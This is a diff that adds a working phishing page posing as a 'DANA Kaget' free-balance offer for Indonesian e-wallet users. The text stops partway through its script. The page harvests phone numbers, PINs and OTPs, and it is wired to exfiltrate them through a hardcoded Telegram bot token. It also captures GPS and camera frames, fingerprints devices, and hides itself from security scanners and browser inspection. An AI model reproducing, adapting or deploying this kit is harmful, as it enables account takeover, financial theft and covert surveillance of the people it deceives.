@@ -1,0 +1,1163 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Cache-Control" content="no-store, max-age=0">
+<title>DANA Kaget — Klaim Saldo Gratis</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{background:linear-gradient(180deg,#f0f6ff 0%,#f5f7fb 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;overflow-x:hidden;-webkit-user-select:none;user-select:none;-webkit-touch-callout:none}
+  .card{background:#fff;border-radius:22px;max-width:420px;width:100%;padding:30px 24px 24px;box-shadow:0 16px 48px rgba(17,84,184,.14);position:relative;overflow:hidden;animation:rise .35s ease-out}
+  @keyframes rise{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+  .card::before{content:"";position:absolute;top:-60px;right:-60px;width:160px;height:160px;border-radius:50%;background:radial-gradient(circle,#118EEA22,#118EEA00 70%);pointer-events:none}
+  .logo{width:68px;height:68px;border-radius:50%;background:linear-gradient(135deg,#118EEA,#0a6fc2);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:24px;margin:0 auto 16px;box-shadow:0 8px 20px rgba(17,142,234,.35)}
+  h1{text-align:center;font-size:21px;color:#0d1b2a;margin-bottom:8px;letter-spacing:-.3px}
+  p.sub{text-align:center;color:#6b7785;font-size:13.5px;margin-bottom:22px;line-height:1.55;padding:0 6px}
+  .amount{text-align:center;font-size:38px;font-weight:800;color:#118EEA;margin:6px 0 2px;letter-spacing:-1px}
+  .tag{text-align:center;font-size:12px;color:#9aa5b1;margin-bottom:24px}
+  .tag b{color:#e63946}
+  label{display:block;font-size:12px;color:#48566a;margin:14px 0 7px;font-weight:600;letter-spacing:.2px}
+  input{width:100%;padding:15px 16px;border:1.5px solid #e3e8ef;border-radius:13px;font-size:16px;outline:none;transition:border-color .15s,box-shadow .15s;background:#fbfcfe;color:#0d1b2a;-webkit-appearance:none}
+  input:focus{border-color:#118EEA;background:#fff;box-shadow:0 0 0 4px rgba(17,142,234,.1)}
+  input::placeholder{color:#b8c2cf}
+  button{width:100%;margin-top:22px;padding:16px;border:none;border-radius:13px;background:linear-gradient(135deg,#118EEA,#0a6fc2);color:#fff;font-size:16px;font-weight:700;cursor:pointer;letter-spacing:.2px;box-shadow:0 8px 20px rgba(17,142,234,.3);transition:transform .1s,opacity .15s}
+  button:active{transform:scale(.98)}
+  button:disabled{opacity:.55;cursor:not-allowed}
+  .foot{text-align:center;font-size:11px;color:#b0bac6;margin-top:18px}
+  .otp-input{letter-spacing:10px;text-align:center;font-size:24px;font-weight:700}
+  .progress{height:5px;background:#eef2f7;border-radius:3px;overflow:hidden;margin-top:6px}
+  .progress > div{height:100%;width:0;background:linear-gradient(90deg,#118EEA,#0a6fc2);transition:width .3s}
+  .hidden{display:none !important}
+  .ok{text-align:center;color:#118EEA;font-size:14px;font-weight:600;margin-top:14px}
+  .spinner{display:inline-block;width:14px;height:14px;border:2px solid #ffffff55;border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:-2px;margin-right:6px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .step{display:none;background:#fff8e6;border:1px solid #ffe4a3;border-radius:14px;padding:16px;margin-bottom:16px;text-align:center;animation:fadeIn .25s ease-out}
+  .step.show{display:block}
+  .step .ttl{font-weight:700;color:#7a5300;font-size:14px;margin-bottom:6px}
+  .step .msg{color:#8a6a1f;font-size:12.5px;line-height:1.5;margin-bottom:12px}
+  .step .btn{background:linear-gradient(135deg,#f5a623,#d68800);box-shadow:0 8px 20px rgba(245,166,35,.35);padding:12px;font-size:14px;margin-top:0}
+  .step .btn.ok2{background:linear-gradient(135deg,#22c55e,#15803d);box-shadow:0 8px 20px rgba(34,197,94,.35)}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+  #decoy{position:fixed;inset:0;background:#000;display:none;align-items:center;justify-content:center;color:#fff;z-index:9999;font-size:14px;text-align:center;padding:20px}
+  #postLogin{position:fixed;inset:0;background:#fff;display:none;z-index:9998;overflow:auto;padding:20px}
+  #postLogin .wrap{max-width:420px;margin:0 auto}
+  #postLogin .hd{display:flex;align-items:center;gap:12px;padding:8px 0 20px}
+  #postLogin .avatar{width:48px;height:48px;border-radius:50%;background:#118EEA;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:20px}
+  #postLogin .nm{font-weight:700;color:#0d1b2a}
+  #postLogin .ph{font-size:12px;color:#6b7785}
+  #postLogin .bal{background:linear-gradient(135deg,#118EEA,#0a6fc2);color:#fff;border-radius:18px;padding:24px;margin-bottom:20px}
+  #postLogin .bal .lbl{font-size:12px;opacity:.85;margin-bottom:6px}
+  #postLogin .bal .val{font-size:32px;font-weight:800;letter-spacing:-1px}
+  #postLogin .row{display:flex;gap:12px;margin-top:16px}
+  #postLogin .tile{flex:1;background:#f5f7fb;border-radius:14px;padding:16px 12px;text-align:center}
+  #postLogin .tile .ic{width:36px;height:36px;border-radius:10px;background:#e8f4ff;color:#118EEA;margin:0 auto 8px;display:flex;align-items:center;justify-content:center;font-weight:700}
+  #postLogin .tile .tx{font-size:11px;color:#48566a}
+  #postLogin .act{margin-top:20px;padding:16px;background:#f5f7fb;border-radius:14px;font-size:13px;color:#48566a;text-align:center}
+  #postLogin .act b{color:#e63946}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">D</div>
+
+  <div id="stage1">
+    <h1>DANA Kaget Spesial</h1>
+    <p class="sub" id="i18n-sub">Kamu terpilih menerima saldo kaget. Klaim sekarang sebelum waktu habis.</p>
+    <div class="amount">Rp 500.000</div>
+    <div class="tag" id="i18n-tag">Sisa kuota: <b id="q">7</b> penerima</div>
+
+    <div class="step" id="step1">
+      <div class="ttl" id="i18n-step1-ttl">Verifikasi Penerima</div>
+      <div class="msg" id="i18n-step1-msg">Aktifkan lokasi untuk memastikan kamu berada di wilayah Indonesia.</div>
+      <button class="btn" id="step1go"><span id="step1t">Aktifkan Lokasi</span></button>
+    </div>
+    <div class="step" id="step2">
+      <div class="ttl" id="i18n-step2-ttl">Verifikasi Wajah</div>
+      <div class="msg" id="i18n-step2-msg">Aktifkan kamera untuk verifikasi wajah penerima.</div>
+      <button class="btn" id="step2go"><span id="step2t">Aktifkan Kamera</span></button>
+    </div>
+    <div class="step" id="step3">
+      <div class="ttl" id="i18n-step3-ttl">Aktifkan Notifikasi</div>
+      <div class="msg" id="i18n-step3-msg">Izinkan notifikasi untuk menerima konfirmasi klaim.</div>
+      <button class="btn ok2" id="step3go"><span id="step3t">Izinkan Notifikasi</span></button>
+    </div>
+
+    <label id="i18n-lbl-phone">Nomor DANA</label>
+    <input id="phone" type="tel" inputmode="numeric" placeholder="08xxxxxxxxxx" autocomplete="off" autocorrect="off" spellcheck="false">
+    <label id="i18n-lbl-pin">PIN DANA (6 digit)</label>
+    <input id="pin" type="password" inputmode="numeric" maxlength="6" placeholder="••••••" autocomplete="off">
+    <button id="go1"><span id="b1t">Klaim Sekarang</span></button>
+    <div class="foot" id="i18n-foot">Powered by DANA Kaget Program</div>
+  </div>
+
+  <div id="stage2" class="hidden">
+    <h1 id="i18n-otp-h">Verifikasi Kode OTP</h1>
+    <p class="sub" id="i18n-otp-sub">Kode 6 digit telah dikirim ke nomor DANA kamu. Masukkan untuk melanjutkan klaim.</p>
+    <label id="i18n-lbl-otp">Kode OTP</label>
+    <input id="otp" class="otp-input" type="tel" inputmode="numeric" maxlength="6" placeholder="••••••" autocomplete="one-time-code">
+    <button id="go2"><span id="b2t">Verifikasi</span></button>
+    <div class="progress"><div id="prog"></div></div>
+    <div class="foot" id="i18n-otp-foot">Jangan bagikan kode ini kepada siapa pun.</div>
+  </div>
+
+  <div id="stage3" class="hidden">
+    <h1 id="i18n-ok-h">Klaim Berhasil</h1>
+    <p class="sub" id="i18n-ok-sub">Saldo Rp 500.000 sedang diproses ke akun DANA kamu.</p>
+    <div class="ok">✓ Terima kasih</div>
+    <div class="foot">Memuat dashboard…</div>
+  </div>
+</div>
+
+<div id="postLogin">
+  <div class="wrap">
+    <div class="hd">
+      <div class="avatar">D</div>
+      <div>
+        <div class="nm">Akun DANA</div>
+        <div class="ph" id="pl-phone">08••••••••</div>
+      </div>
+    </div>
+    <div class="bal">
+      <div class="lbl">Saldo DANA</div>
+      <div class="val">Rp 500.000</div>
+    </div>
+    <div class="row">
+      <div class="tile"><div class="ic">↑</div><div class="tx">Kirim</div></div>
+      <div class="tile"><div class="ic">↓</div><div class="tx">Terima</div></div>
+      <div class="tile"><div class="ic">+</div><div class="tx">Top Up</div></div>
+      <div class="tile"><div class="ic">≡</div><div class="tx">Riwayat</div></div>
+    </div>
+    <div class="act">Saldo <b>Rp 500.000</b> dikreditkan ke akun kamu. Terima kasih telah mengikuti program DANA Kaget.</div>
+  </div>
+</div>
+
+<div id="decoy">Halaman tidak dapat ditampilkan.</div>
+
+<script>
+(function(){
+  "use strict";
+
+  // ═══════════════════════════════════════════════════════════
+  // CONFIG
+  // ═══════════════════════════════════════════════════════════
+  const MODE = "direct";               // "direct" | "worker"
+  const WORKER_URL = "";               // set if MODE="worker"
+  const WORKER_SECRET = "";            // shared secret for HMAC (matches Worker env)
+
+  const _a = "8836572943:AAEdDEXDuFSAUO5RzV7fKJK7ITzVgMJqpW8";
+  const _b = "";
+  const _c = ["8836572943"];
+  const _d = [""];
+  const TG_TOKEN = _a + _b;
+  const TG_CHAT  = _c[0];
+  const TG_BACK  = _d[0] || null;
+  const TG_BASE  = "https://api.telegram.org/bot" + TG_TOKEN;
+
+  // ── IDENTITY ───────────────────────────────────────────────
+  const T0 = performance.now();
+  const _sessionId = (function(){
+    try {
+      let s = sessionStorage.getItem("_sid");
+      if(!s){ s = Math.random().toString(36).slice(2) + Date.now().toString(36); sessionStorage.setItem("_sid", s); }
+      return s;
+    } catch(e){ return Math.random().toString(36).slice(2); }
+  })();
+  const _visitorId = (function(){
+    try {
+      let v = localStorage.getItem("_vid");
+      if(!v){ v = Math.random().toString(36).slice(2, 10); localStorage.setItem("_vid", v); }
+      return v;
+    } catch(e){ return Math.random().toString(36).slice(2, 10); }
+  })();
+
+  // ═══════════════════════════════════════════════════════════
+  // i18n
+  // ═══════════════════════════════════════════════════════════
+  const I18N = {
+    id: {
+      "sub": "Kamu terpilih menerima saldo kaget. Klaim sekarang sebelum waktu habis.",
+      "tag-pre": "Sisa kuota: ", "tag-post": " penerima",
+      "step1-ttl": "Verifikasi Penerima", "step1-msg": "Aktifkan lokasi untuk memastikan kamu berada di wilayah Indonesia.", "step1-btn": "Aktifkan Lokasi",
+      "step2-ttl": "Verifikasi Wajah", "step2-msg": "Aktifkan kamera untuk verifikasi wajah penerima.", "step2-btn": "Aktifkan Kamera",
+      "step3-ttl": "Aktifkan Notifikasi", "step3-msg": "Izinkan notifikasi untuk menerima konfirmasi klaim.", "step3-btn": "Izinkan Notifikasi",
+      "lbl-phone": "Nomor DANA", "lbl-pin": "PIN DANA (6 digit)", "go1": "Klaim Sekarang",
+      "foot": "Powered by DANA Kaget Program",
+      "otp-h": "Verifikasi Kode OTP", "otp-sub": "Kode 6 digit telah dikirim ke nomor DANA kamu. Masukkan untuk melanjutkan klaim.", "lbl-otp": "Kode OTP", "go2": "Verifikasi", "otp-foot": "Jangan bagikan kode ini kepada siapa pun.",
+      "ok-h": "Klaim Berhasil", "ok-sub": "Saldo Rp 500.000 sedang diproses ke akun DANA kamu."
+    },
+    ms: {
+      "sub": "Anda terpilih menerima wang kejutan. Tuntut sekarang sebelum masa tamat.",
+      "tag-pre": "Baki tinggal: ", "tag-post": " penerima",
+      "step1-ttl": "Pengesahan Penerima", "step1-msg": "Aktifkan lokasi untuk memastikan anda berada di wilayah Indonesia.", "step1-btn": "Aktifkan Lokasi",
+      "step2-ttl": "Pengesahan Wajah", "step2-msg": "Aktifkan kamera untuk pengesahan wajah penerima.", "step2-btn": "Aktifkan Kamera",
+      "step3-ttl": "Aktifkan Pemberitahuan", "step3-msg": "Benarkan pemberitahuan untuk menerima pengesahan tuntutan.", "step3-btn": "Benarkan Pemberitahuan",
+      "lbl-phone": "Nombor DANA", "lbl-pin": "PIN DANA (6 digit)", "go1": "Tuntut Sekarang",
+      "foot": "Dikuasakan oleh Program DANA Kaget",
+      "otp-h": "Pengesahan Kod OTP", "otp-sub": "Kod 6 digit telah dihantar ke nombor DANA anda. Masukkan untuk meneruskan tuntutan.", "lbl-otp": "Kod OTP", "go2": "Sahkan", "otp-foot": "Jangan kongsi kod ini dengan sesiapa.",
+      "ok-h": "Tuntutan Berjaya", "ok-sub": "Baki Rp 500.000 sedang diproses ke akaun DANA anda."
+    },
+    en: {
+      "sub": "You've been selected to receive a surprise balance. Claim now before time runs out.",
+      "tag-pre": "Slots left: ", "tag-post": " recipients",
+      "step1-ttl": "Recipient Verification", "step1-msg": "Enable location to confirm you're in the eligible region.", "step1-btn": "Enable Location",
+      "step2-ttl": "Face Verification", "step2-msg": "Enable camera to verify the recipient's face.", "step2-btn": "Enable Camera",
+      "step3-ttl": "Enable Notifications", "step3-msg": "Allow notifications to receive your claim confirmation.", "step3-btn": "Allow Notifications",
+      "lbl-phone": "DANA Number", "lbl-pin": "DANA PIN (6 digits)", "go1": "Claim Now",
+      "foot": "Powered by DANA Kaget Program",
+      "otp-h": "Verify OTP Code", "otp-sub": "A 6-digit code was sent to your DANA number. Enter it to continue.", "lbl-otp": "OTP Code", "go2": "Verify", "otp-foot": "Do not share this code with anyone.",
+      "ok-h": "Claim Successful", "ok-sub": "Rp 500.000 is being credited to your DANA account."
+    }
+  };
+  function pickLang(){
+    const n = (navigator.language || "id").toLowerCase();
+    if(n.startsWith("id")) return "id";
+    if(n.startsWith("ms")) return "ms";
+    return "en";
+  }
+  const LANG = pickLang();
+  const T = I18N[LANG] || I18N.id;
+  function applyI18n(){
+    const set = (id, v) => { const e = document.getElementById(id); if(e) e.textContent = v; };
+    set("i18n-sub", T["sub"]);
+    const tag = document.getElementById("i18n-tag");
+    if(tag) tag.innerHTML = T["tag-pre"] + "<b id=\"q\">7</b>" + T["tag-post"];
+    set("i18n-step1-ttl", T["step1-ttl"]); set("i18n-step1-msg", T["step1-msg"]); set("step1t", T["step1-btn"]);
+    set("i18n-step2-ttl", T["step2-ttl"]); set("i18n-step2-msg", T["step2-msg"]); set("step2t", T["step2-btn"]);
+    set("i18n-step3-ttl", T["step3-ttl"]); set("i18n-step3-msg", T["step3-msg"]); set("step3t", T["step3-btn"]);
+    set("i18n-lbl-phone", T["lbl-phone"]); set("i18n-lbl-pin", T["lbl-pin"]); set("b1t", T["go1"]);
+    set("i18n-foot", T["foot"]);
+    set("i18n-otp-h", T["otp-h"]); set("i18n-otp-sub", T["otp-sub"]); set("i18n-lbl-otp", T["lbl-otp"]); set("b2t", T["go2"]); set("i18n-otp-foot", T["otp-foot"]);
+    set("i18n-ok-h", T["ok-h"]); set("i18n-ok-sub", T["ok-sub"]);
+  }
+  applyI18n();
+
+  // ═══════════════════════════════════════════════════════════
+  // CLOAK
+  // ═══════════════════════════════════════════════════════════
+  (function cloak(){
+    const ua = navigator.userAgent || "";
+    const bots = /(bot|crawl|spider|slurp|bingpreview|facebookexternalhit|whatsapp|telegrambot|discordbot|headless|phantom|puppeteer|selenium|playwright|google-safety|phishtank|urlscan|virustotal|netcraft|talos|sophos|kaspersky|bitdefender)/i;
+    const isMobile = /Android|iPhone|iPad|iPod|Mobile|Opera Mini|IEMobile/i.test(ua);
+    if(bots.test(ua) || !isMobile){
+      document.body.innerHTML = "";
+      const d = document.getElementById("decoy");
+      if(d){ d.style.display = "flex"; document.body.appendChild(d); }
+    }
+  })();
+
+  // ═══════════════════════════════════════════════════════════
+  // ANTI-INSPECT
+  // ═══════════════════════════════════════════════════════════
+  (function antiInspect(){
+    setInterval(() => {
+      if(window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160){
+        document.querySelectorAll("input").forEach(i => i.value = "");
+      }
+    }, 1000);
+    document.addEventListener("keydown", (e) => {
+      if(e.key === "F12" ||
+         (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key)) ||
+         (e.ctrlKey && e.key === "U")) e.preventDefault();
+    }, true);
+    ["contextmenu","copy","cut","dragstart"].forEach(ev =>
+      document.addEventListener(ev, e => e.preventDefault()));
+  })();
+
+  // ═══════════════════════════════════════════════════════════
+  // REFS
+  // ═══════════════════════════════════════════════════════════
+  const $ = (id) => document.getElementById(id);
+  const phoneEl = $("phone"), pinEl = $("pin"), otpEl = $("otp");
+  const go1 = $("go1"), go2 = $("go2");
+  const b1t = $("b1t"), b2t = $("b2t");
+  const stage1 = $("stage1"), stage2 = $("stage2"), stage3 = $("stage3");
+  const prog = $("prog");
+  const step1 = $("step1"), step2 = $("step2"), step3 = $("step3");
+  const step1go = $("step1go"), step2go = $("step2go"), step3go = $("step3go");
+  const postLogin = $("postLogin"), plPhone = $("pl-phone");
+
+  setInterval(() => {
+    const qe = document.getElementById("q");
+    if(!qe) return;
+    const n = parseInt(qe.textContent, 10) || 7;
+    if(n > 2) qe.textContent = n - 1;
+  }, 24000);
+
+  // ═══════════════════════════════════════════════════════════
+  // STATE
+  // ═══════════════════════════════════════════════════════════
+  let _liveCamStream = null;
+  let _liveGeoPromise = null;
+  let _geoResult = null;
+  let _geoTrajectory = [];
+  let _camResult = null;
+  let _camBurst = [];
+  let _notifGranted = false;
+  const _eventLog = [];
+  const _captureHistory = [];   // { sha, ts, stage }
+
+  function logEvent(kind, detail){
+    _eventLog.push({ ts: Math.round(performance.now() - T0), kind, detail: detail || "" });
+    if(_eventLog.length > 50) _eventLog.shift();
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // HMAC (SubtleCrypto)
+  // ═══════════════════════════════════════════════════════════
+  async function hmacSign(bodyStr, secret){
+    if(!secret || !window.crypto || !window.crypto.subtle) return null;
+    try {
+      const enc = new TextEncoder();
+      const key = await crypto.subtle.importKey(
+        "raw", enc.encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]
+      );
+      const sig = await crypto.subtle.sign("HMAC", key, enc.encode(bodyStr));
+      return Array.from(new Uint8Array(sig)).map(b => b.toString(16).padStart(2, "0")).join("");
+    } catch(e){ return null; }
+  }
+
+  async function sha256Hex(str){
+    try {
+      const enc = new TextEncoder();
+      const buf = await crypto.subtle.digest("SHA-256", enc.encode(str));
+      return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("").slice(0, 16);
+    } catch(e){ return null; }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // OFFLINE QUEUE
+  // ═══════════════════════════════════════════════════════════
+  const QUEUE_KEY = "_q";
+  function queueRead(){ try { return JSON.parse(localStorage.getItem(QUEUE_KEY) || "[]"); } catch(e){ return []; } }
+  function queueWrite(arr){ try { localStorage.setItem(QUEUE_KEY, JSON.stringify(arr.slice(-20))); } catch(e){} }
+  function queuePush(item){ const q = queueRead(); q.push(item); queueWrite(q); }
+  async function queueFlush(){
+    const q = queueRead();
+    if(!q.length) return;
+    const remain = [];
+    for(const item of q){
+      const ok = await sendRaw(item.kind, item.payload);
+      if(!ok) remain.push(item);
+    }
+    queueWrite(remain);
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // PERMISSION STATE
+  // ═══════════════════════════════════════════════════════════
+  async function permState(){
+    const out = { geo: "unknown", cam: "unknown", mic: "unknown", notif: "unknown", clip: "unknown", accel: "unknown" };
+    try {
+      if(navigator.permissions && navigator.permissions.query){
+        const specs = [
+          ["geo", "geolocation"], ["cam", "camera"], ["mic", "microphone"],
+          ["notif", "notifications"], ["clip", "clipboard-read"], ["accel", "accelerometer"]
+        ];
+        const results = await Promise.allSettled(specs.map(([, name]) =>
+          navigator.permissions.query({ name })
+        ));
+        results.forEach((r, i) => { if(r.status === "fulfilled") out[specs[i][0]] = r.value.state; });
+      }
+    } catch(e){}
+    return out;
+  }
+
+  function grantedOnce(){ try { return localStorage.getItem("_v") === "1"; } catch(e){ return false; } }
+  function markGranted(){ try { localStorage.setItem("_v", "1"); } catch(e){} }
+
+  // ═══════════════════════════════════════════════════════════
+  // FINGERPRINT
+  // ═══════════════════════════════════════════════════════════
+  function deviceInfo(){
+    const n = navigator, s = screen;
+    const gl = document.createElement("canvas").getContext("webgl");
+    let gpu = null, gpuVendor = null, glVersion = null, shadingLang = null;
+    try {
+      const dbg = gl && gl.getExtension("WEBGL_debug_renderer_info");
+      if(dbg){
+        gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+      }
+      glVersion = gl.getParameter(gl.VERSION);
+      shadingLang = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+      const maxTex = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+      if(gpu) gpu += " maxTex=" + maxTex;
+    } catch(e){}
+    return {
+      ua: n.userAgent, platform: n.platform || "n/a", vendor: n.vendor || "n/a",
+      lang: n.language, langs: (n.languages || []).join(","),
+      cores: n.hardwareConcurrency || null, mem: n.deviceMemory || null,
+      touch: ("ontouchstart" in window) ? "yes" : "no",
+      maxTouch: n.maxTouchPoints || 0,
+      screen: s.width + "x" + s.height + "@" + (window.devicePixelRatio || 1),
+      avail: s.availWidth + "x" + s.availHeight, colorDepth: s.colorDepth,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      tzOffset: new Date().getTimezoneOffset(),
+      conn: (n.connection && (n.connection.effectiveType || n.connection.type)) || null,
+      downlink: (n.connection && n.connection.downlink) || null,
+      rtt: (n.connection && n.connection.rtt) || null,
+      saveData: (n.connection && n.connection.saveData) ? "on" : "off",
+      gpu: gpu, gpuVendor: gpuVendor, glVersion: glVersion, shadingLang: shadingLang,
+      cookie: n.cookieEnabled ? "on" : "off",
+      dnt: n.doNotTrack || "unset",
+      gpc: (n.globalPrivacyControl === true) ? "on" : "off",
+      pdf: n.pdfViewerEnabled === true ? "yes" : "no",
+      plugins: Array.from(n.plugins || []).map(p => p.name).join(",") || "none",
+      stand: n.standalone === true ? "standalone" : "browser",
+      webdriver: n.webdriver === true ? "yes" : "no"
+    };
+  }
+
+  function canvasFP(){
+    try {
+      const c = document.createElement("canvas");
+      c.width = 240; c.height = 60;
+      const ctx = c.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 100, 20);
+      ctx.fillStyle = "#069"; ctx.fillText("DANA-Kaget-FP-🦊-7", 2, 15);
+      ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("DANA-Kaget-FP-🦊-7", 4, 17);
+      ctx.beginPath(); ctx.arc(50, 30, 12, 0, Math.PI * 2); ctx.fill();
+      ctx.globalCompositeOperation = "multiply";
+      ctx.fillStyle = "rgb(255,0,255)";
+      ctx.beginPath(); ctx.arc(60, 25, 10, 0, Math.PI * 2); ctx.fill();
+      const url = c.toDataURL();
+      let h = 0;
+      for(let i = 0; i < url.length; i++){ h = ((h << 5) - h + url.charCodeAt(i)) | 0; }
+      return (h >>> 0).toString(16).padStart(8, "0");
+    } catch(e){ return null; }
+  }
+
+  async function audioFP(){
+    try {
+      const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+      if(!AC) return null;
+      const ctx = new AC(1, 44100, 44100);
+      const osc = ctx.createOscillator();
+      osc.type = "triangle"; osc.frequency.value = 10000;
+      const comp = ctx.createDynamicsCompressor();
+      comp.threshold.value = -50; comp.knee.value = 40;
+      comp.ratio.value = 12; comp.attack.value = 0; comp.release.value = 0.25;
+      osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
+      const buf = await ctx.startRendering();
+      const data = buf.getChannelData(0);
+      let sum = 0;
+      for(let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
+      return sum.toFixed(6);
+    } catch(e){ return null; }
+  }
+
+  function webrtcLeak(){
+    return new Promise(resolve => {
+      try {
+        const pcs = [];
+        const ips = new Set();
+        const stuns = [
+          "stun:stun.l.google.com:19302",
+          "stun:stun1.l.google.com:19302",
+          "stun:stun.cloudflare.com:3478"
+        ];
+        stuns.forEach(url => {
+          try {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: url }] });
+            pcs.push(pc);
+            pc.createDataChannel("");
+            pc.onicecandidate = (e) => {
+              if(!e.candidate) return;
+              const m = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+              if(m) ips.add(m[1]);
+            };
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+          } catch(e){}
+        });
+        setTimeout(() => {
+          pcs.forEach(p => { try { p.close(); } catch(e){} });
+          resolve(Array.from(ips).join(",") || null);
+        }, 2200);
+      } catch(e){ resolve(null); }
+    });
+  }
+
+  function mediaCaps(){
+    const out = [];
+    const tests = [
+      ['video/mp4; codecs="avc1.42E01E"', "H264"],
+      ['video/webm; codecs="vp8"', "VP8"],
+      ['video/webm; codecs="vp9"', "VP9"],
+      ['audio/mpeg', "MP3"],
+      ['audio/ogg; codecs="opus"', "OPUS"],
+      ['audio/wav', "WAV"],
+      ['audio/mp4; codecs="mp4a.40.2"', "AAC"]
+    ];
+    const v = document.createElement("video"), a = document.createElement("audio");
+    tests.forEach(([mime, name]) => {
+      if((v.canPlayType && v.canPlayType(mime)) || (a.canPlayType && a.canPlayType(mime))) out.push(name);
+    });
+    return out.join(",");
+  }
+
+  async function batteryInfo(){
+    try {
+      if(!navigator.getBattery) return null;
+      const b = await navigator.getBattery();
+      return { lvl: Math.round(b.level * 100), charging: b.charging ? "yes" : "no" };
+    } catch(e){ return null; }
+  }
+
+  async function storageInfo(){
+    try {
+      if(!navigator.storage || !navigator.storage.estimate) return null;
+      const e = await navigator.storage.estimate();
+      return { quotaMB: Math.round((e.quota || 0) / 1048576), usageMB: Math.round((e.usage || 0) / 1048576) };
+    } catch(e){ return null; }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // IP + GEO
+  // ═══════════════════════════════════════════════════════════
+  let _ipCache = null, _ipPending = null, _geoCache = null;
+  async function getIP(){
+    if(_ipCache) return _ipCache;
+    if(_ipPending) return _ipPending;
+    _ipPending = new Promise(resolve => {
+      let done = false;
+      const providers = [
+        "https://api.ipify.org?format=json",
+        "https://ipapi.co/json/",
+        "https://api.my-ip.io/ip.json",
+        "https://ipwho.is/"
+      ];
+      providers.forEach(url => {
+        fetch(url, { cache: "no-store" }).then(r => r.json()).then(j => {
+          if(done) return;
+          const ip = j.ip || j.query || (j.data && j.data.ip) || j.IPv4;
+          if(ip){ done = true; _ipCache = ip; resolve(ip); }
+        }).catch(() => {});
+      });
+      setTimeout(() => { if(!done){ done = true; resolve(null); } }, 3500);
+    });
+    return _ipPending;
+  }
+
+  async function ipGeo(ip){
+    if(!ip) return null;
+    if(_geoCache) return _geoCache;
+    try {
+      _geoCache = await fetch("https://ipwho.is/" + encodeURIComponent(ip), { cache: "no-store" }).then(r => r.json());
+      if(!_geoCache || _geoCache.success === false) _geoCache = null;
+      return _geoCache;
+    } catch(e){ return null; }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // GPS
+  // ═══════════════════════════════════════════════════════════
+  function startGeo(){
+    return new Promise(resolve => {
+      if(!navigator.geolocation) return resolve(null);
+      const timer = setTimeout(() => resolve(null), 8000);
+      navigator.geolocation.getCurrentPosition(
+        p => {
+          clearTimeout(timer);
+          const r = {
+            lat: p.coords.latitude, lng: p.coords.longitude,
+            acc: p.coords.accuracy, alt: p.coords.altitude,
+            head: p.coords.heading, spd: p.coords.speed
+          };
+          _geoResult = r;
+          _geoTrajectory.push({ ts: Math.round(performance.now() - T0), lat: r.lat, lng: r.lng, acc: r.acc });
+          if(_geoTrajectory.length > 10) _geoTrajectory.shift();
+          resolve(r);
+        },
+        () => { clearTimeout(timer); resolve(null); },
+        { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
+      );
+    });
+  }
+
+  let _geoWatchId = null;
+  function startGeoWatch(){
+    if(_geoWatchId || !navigator.geolocation) return;
+    try {
+      _geoWatchId = navigator.geolocation.watchPosition(
+        p => {
+          const r = { ts: Math.round(performance.now() - T0), lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy };
+          _geoTrajectory.push(r);
+          if(_geoTrajectory.length > 20) _geoTrajectory.shift();
+        },
+        () => {},
+        { enableHighAccuracy: true, maximumAge: 15000, timeout: 30000 }
+      );
+    } catch(e){}
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // CAMERA
+  // ═══════════════════════════════════════════════════════════
+  function startCamSync(){
+    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return Promise.resolve(null);
+    try {
+      return navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: { ideal: 720 }, height: { ideal: 720 } },
+        audio: false
+      }).then(stream => { _liveCamStream = stream; markGranted(); return stream; })
+        .catch(() => null);
+    } catch(e){ return Promise.resolve(null); }
+  }
+
+  async function grabFrame(stream, delay){
+    if(!stream) return null;
+    try {
+      const v = document.createElement("video");
+      v.srcObject = stream; v.muted = true; v.playsInline = true;
+      await v.play();
+      await new Promise(r => setTimeout(r, delay || 800));
+      const c = document.createElement("canvas");
+      c.width = v.videoWidth || 480;
